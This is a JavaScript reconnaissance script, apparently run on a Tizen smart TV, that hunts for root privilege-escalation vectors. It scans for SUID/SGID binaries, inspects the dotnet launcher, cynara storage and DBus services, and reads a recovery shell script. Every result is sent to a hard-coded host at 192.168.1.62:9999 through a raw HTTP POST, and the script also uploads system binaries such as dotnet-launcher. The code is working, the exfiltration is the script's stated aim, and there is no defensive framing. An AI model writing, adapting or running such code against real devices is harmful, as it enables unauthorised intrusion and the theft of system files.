"use strict";
/* p44: root-write vector hunt
   1. all SUID/SGID binaries
   2. dotnet landscape (launcher cap_setuid)
   3. cynara storage
   4. vd_pkg_initdb_on_recovery.sh + pkg_initdb perms
   5. DBus ListNames filtered (appctx/context)
   6. Introspect org.tizen.tv.appfw.appctxmgr
   exfil /p44info
*/
var fs = null, cp = null, net = null, crypto = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
try { crypto = require('crypto'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p44', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFile(p, name) {
  try {
    var b = fs.readFileSync(p);
    R.results['exfil_' + name] = b.length + 'B';
    postBuf('/bin2_' + name, b);
  } catch (e) { R.results['exfil_' + name] = 'ERR ' + String(e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p44info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

var steps = [
  { name: 'suid_scan', fn: function () {
      return run('find /bin /sbin /usr/bin /usr/sbin /org /opt/usr/apps 2>/dev/null -perm -4000 -type f | head -40; echo ===SGID; find /bin /sbin /usr/bin /usr/sbin /org 2>/dev/null -perm -2000 -type f | head -40', 40000);
  }},
  { name: 'suid_list_all', fn: function () {
      return run('ls -la /usr/bin/wasutility /usr/bin/dotnet-launcher /usr/sbin/sdbd /usr/bin/su 2>&1; echo ===; find / -xdev -perm -4000 -type f 2>/dev/null | head -60', 60000);
  }},
  { name: 'dotnet_landscape', fn: function () {
      return run('ls -la /usr/bin/dotnet/ 2>&1 | head -20; echo ===APPS; ls -la /usr/bin/dotnet/apps/ 2>&1 | head -40; echo ===PS; ps -ef 2>/dev/null | grep -i dotnet | grep -v grep; echo ===CFG; find /usr/bin/dotnet -maxdepth 4 -name "*.json" 2>/dev/null | head -20', 40000);
  }},
  { name: 'cynara_storage', fn: function () {
      return run('ls -la /opt/usr/data/ 2>/dev/null | head -25; echo ===; find /opt -maxdepth 3 -name "*cynara*" 2>/dev/null | head -15; echo ===; ls -la /run/cynara/ 2>&1 | head -12', 25000);
  }},
  { name: 'pkg_initdb_sh', fn: function () {
      return run('ls -la /usr/bin/vd_pkg_initdb_on_recovery.sh /usr/bin/pkg_initdb 2>&1; echo ===SH; cat /usr/bin/vd_pkg_initdb_on_recovery.sh 2>&1', 15000);
  }},
  { name: 'dbus_names_ctx', fn: function () {
      return run('dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>/dev/null | grep -iE "ctx|context|appctx|app-ctx|tvctx|pkg|initdb" | head -20', 30000);
  }},
  { name: 'dbus_introspect_appctxmgr', fn: function () {
      return run('dbus-send --system --print-reply --dest=org.tizen.tv.appfw.appctxmgr / org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -150', 30000);
  }},
  { name: 'exfil_more', fn: function () {
      postFile('/usr/bin/vd_pkg_initdb_on_recovery.sh', 'vd_pkg_initdb_on_recovery.sh');
      postFile('/usr/bin/dotnet-launcher', 'dotnet-launcher');
      return new Promise(function (resolve) { setTimeout(function () { resolve('done'); }, 15000); });
  }}
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 240000);
